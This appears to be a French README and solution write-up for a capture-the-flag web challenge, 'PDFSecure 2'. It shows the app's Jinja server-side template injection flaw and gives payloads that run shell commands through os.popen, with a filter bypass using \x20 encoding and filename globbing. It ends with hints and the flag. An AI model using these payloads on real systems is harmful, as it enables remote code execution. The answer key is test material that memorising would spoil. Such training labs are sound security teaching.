# PDFSecure 2

## Démarrage

```
docker build -t pdfsecure2 .
docker run -p 5001:5001 --rm --name pdfsecure2 pdfsecure2
```

## Fichiers à fournir

- Le fichier app.py
- Le lien de l'instance

## Description

Il s'agit d'un challenge de web, le but est d'afficher le contenu de flag_784157824782217751.txt. Cette fois ci l'application n'est plus vulnérable aux injections de commandes. Cependant en regardant le code source l'utilisateur pourra voir qu'il y a une SSTI:

```
template = Template(f'{ user_input }')
rendered_input = template.render(user_input=user_input)
```

A partir de là il pourra injecter des commandes via la SSTI, cependant certains filtres ont été mis en place pour rendre cela plus challengant.

Il est possible d'executer un ls simplement avec un payload du type:

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

Ce payload peut se trouver sur internet en mettant SSTI payload:
https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

La vrai 'difficulté' réside sur le bypass des filtres, en effet ' ' et 'flag' sont des caractères interdit, pour bypass ' ' on peut utiliser son encodage hexadecimal soit \x20. 

Pour contourner la restriction pour 'flag' il est possible d'utiliser un regex de tel sorte à faire un

```
cat *
```
ou
```
cat fl*
```
etc ...

en résumé voici l'un des payload possible :

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls\x20-la').read()}}
```

Une fois cela fait il est possible de trouver le nom du fichier contenant le flag

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat\x20fl*').read()}}
```

Hint 1 : Une Template ? Mais pour quoi faire ?
Hint 2 : Une doc qui pourrait aider: https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/
Hint 3 : Hexactement, il faut toujours compter sur sa bonne *
Flag : CTFAC{5sT1_0n_W4t3erM4rKs}